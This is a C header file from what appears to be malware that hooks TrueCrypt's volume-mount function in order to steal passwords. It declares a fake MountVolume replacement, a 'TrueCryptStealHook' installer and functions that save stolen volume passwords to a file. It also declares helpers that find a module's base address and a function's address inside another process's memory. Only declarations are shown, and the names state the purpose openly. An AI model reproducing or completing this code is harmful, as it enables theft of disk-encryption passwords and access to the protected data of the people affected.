#pragma once

typedef struct
{
	unsigned __int32 Length;
	unsigned char Text[65];
	char Pad[3];
} Password;

typedef struct
{
	BOOL ReadOnly;
	BOOL Removable;
	BOOL ProtectHiddenVolume;
	BOOL PreserveTimestamp;
	BOOL PartitionInInactiveSysEncScope;
	Password ProtectedHidVolPassword;
	BOOL UseBackupHeader;
	BOOL RecoveryMode;
} MountOptions;

typedef int(* _MountVolume)(HWND hwndDlg, int driveNo, char *volumePath, Password *password, BOOL cachePassword, BOOL sharedAccess,
							const MountOptions* const mountOptions, BOOL quiet, BOOL bReportWrongPassword);

int FakeMountVolume(HWND hwndDlg, int driveNo, char *volumePath, Password *password, BOOL cachePassword, BOOL sharedAccess,
					const MountOptions* const mountOptions, BOOL quiet, BOOL bReportWrongPassword);

BOOL TrueCryptStealHook();

void SaveStealPassword(LPSTR volumePath, PBYTE password, UINT passwordLen);
void GetFilePathToSaveStealPassword(LPSTR rootPath, LPSTR volumePath, LPSTR fileToSave);

BOOL GetBaseAddressAndSizeModuleInProcess(HANDLE hProc, LPVOID &base, DWORD &size, LPWCH trueModuleName, int trueModuleNameSize);
BOOL FullModuleNameIsTrueModuleName(LPWCH moduleName, LPWCH trueModuleName, int trueModuleNameSize);
BOOL GetFunctionAddressInProcessMemory(HANDLE hProc, LPVOID base, DWORD size, LPVOID &functionAddress, PBYTE bytes, size_t countBytes);